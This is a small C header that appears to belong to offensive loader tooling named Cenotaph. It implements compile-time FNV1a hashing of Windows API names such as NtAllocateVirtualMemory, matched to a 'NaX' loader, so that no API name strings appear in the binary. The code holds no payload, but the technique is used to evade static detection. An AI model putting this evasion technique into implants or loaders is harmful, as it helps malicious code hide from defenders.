/*
 * Cenotaph — compile-time FNV1a hashing (no API name strings in the binary).
 * Verbatim algorithm from NaX src_loader/include/Constexpr.h: same seed,
 * prime, and case-fold, so HASH_STR("NtAllocateVirtualMemory") here equals
 * the hash NaX's loader resolves at runtime.
 */
#ifndef CENOTAPH_CONSTEXPR_H
#define CENOTAPH_CONSTEXPR_H

#include "Cenotaph.h"

#define HASH_STR( x ) ExprHashStringA( ( x ) )

static constexpr ULONG ExprHashStringA( PCHAR String ) {
    ULONG Hash = H_MAGIC_KEY;
    CHAR  Char = 0;

    if ( ! String )
        return 0;

    while ( ( Char = *String++ ) ) {
        if ( Char >= 'a' )
            Char -= 0x20;
        Hash ^= (UCHAR)Char;
        Hash *= H_MAGIC_PRIME;
    }
    return Hash;
}

#endif /* CENOTAPH_CONSTEXPR_H */